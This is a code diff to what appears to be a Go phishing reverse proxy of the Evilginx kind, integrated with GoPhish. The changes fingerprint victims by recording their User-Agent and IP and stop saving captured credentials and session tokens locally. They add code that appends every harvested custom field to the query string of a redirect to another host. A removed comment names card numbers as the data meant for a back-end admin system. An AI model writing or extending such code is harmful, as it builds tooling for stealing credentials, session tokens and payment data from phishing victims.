@@ -105,6 +105,24 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	}
 	return newBody, nil
 }
+func SetJSONVariableDeep(body []byte, key string, value interface{}) ([]byte, error) {
+	var data map[string]interface{}
+	if err := json.Unmarshal(body, &data); err != nil {
+		return nil, err
+	}
+
+	keys := strings.Split(key, ".")
+	m := data
+	for i := 0; i < len(keys)-1; i++ {
+		if _, ok := m[keys[i]]; !ok {
+			m[keys[i]] = map[string]interface{}{}
+		}
+		m = m[keys[i]].(map[string]interface{})
+	}
+	m[keys[len(keys)-1]] = value
+
+	return json.Marshal(data)
+}
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
@@ -309,7 +327,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 					var create_session bool = true
 					var ok bool = false
-					// 前请求url带的 cookie   p.cookieName xxxx-xxxx)
+					// 前请求url带的 cookie   session_cookie xxxx-xxxx)
 					sc, err := req.Cookie(session_cookie)
 					if err == nil {
 						ps.Index, ok = p.sids[sc.Value]
@@ -405,6 +423,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
+									// 设置指纹信息
+									p.setSessionCustom(session.Id, "fg_userAgent", req.Header.Get("User-Agent"))
+									p.setSessionCustom(session.Id, "fg_ip", remote_addr)
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										rid, ok := session.Params["rid"]
@@ -682,11 +703,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
 						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
 
-						//TODO  这里通过ws 把卡号等数据传给后台管理系统
-						//TODO  也可以通过cookie传递
 						if json_re.MatchString(contentType) {
 
-							if pl.username.tp == "json" {
+							/*if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
 								if um != nil && len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
@@ -707,19 +726,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 								}
-							}
-
+							}*/
+							// TODO 按请求url进行拦截， 不拦截所有请求
 							for _, cp := range pl.custom {
 								if cp.tp == "json" {
 									cm := cp.search.FindStringSubmatch(string(body))
 									if cm != nil && len(cm) > 1 {
-										// TODO 处理custom参数   怎么发送给后台？
-
+										// 处理custom参数  存入p.sessions
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-											log.Error("database: %v", err)
-										}
+										// 不存本地数据库了
+										//if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+										//	log.Error("database: %v", err)
+										//}
 									}
 								}
 							}
@@ -751,7 +770,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 									if ok_search {
 										for _, fp_f := range fp.force {
-											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											body, err = SetJSONVariableDeep(body, fp_f.key, fp_f.value)
 											if err != nil {
 												log.Debug("force_post: got error: %s", err)
 											}
@@ -771,7 +790,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								for k, v := range req.PostForm {
 									// patch phishing URLs in POST params with original domains
 
-									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
+									/*if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
@@ -790,18 +809,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 										}
-									}
+									}*/
 									for _, cp := range pl.custom {
 										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
 											cm := cp.search.FindStringSubmatch(v[0])
 											if cm != nil && len(cm) > 1 {
-												// TODO 处理custom参数
-
+												// 处理custom参数 存入p.sessions
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-													log.Error("database: %v", err)
-												}
+												// 不存本地数据库了
+												//if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+												//	log.Error("database: %v", err)
+												//}
 											}
 										}
 									}
@@ -878,7 +897,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
 						//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
 						if ic.domain == req.Host && ic.path.MatchString(req.URL.Path) {
-							return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+							//TODO 配合重定向，从p.sessions 获取session信息, 插入重定向值param
+							return p.interceptRequest(ctx, req, ic.http_status, ic.body, ic.mime)
 						}
 					}
 					//}
@@ -1082,15 +1102,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 
-						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
-							log.Error("database: %v", err)
-						}
+						//if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+						//	log.Error("database: %v", err)
+						//}
+						//if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
+						//	log.Error("database: %v", err)
+						//}
+						//if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
+						//	log.Error("database: %v", err)
+						//}
 						s.Finish(false)
 
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
@@ -1331,7 +1351,7 @@ func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Respon
 	return req, nil
 }
 
-func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
+func (p *HttpProxy) interceptRequest(ctx *goproxy.ProxyCtx, req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
 	if mime == "redirect" {
 		// proxy 重定向
 		//resp := goproxy.NewResponse(req, mime, http.StatusMovedPermanently, "")
@@ -1341,6 +1361,13 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 		req.Host = body
 		req.URL.Host = body
 		req.URL.Scheme = "http"
+		// 设置参数到url
+		q := req.URL.Query()
+		session := p.sessions[ctx.UserData.(*ProxySession).SessionId]
+		for k, v := range session.Custom {
+			q.Set(k, v)
+		}
+		req.URL.RawQuery = q.Encode()
 		return req, nil
 	}
 	if mime == "" {
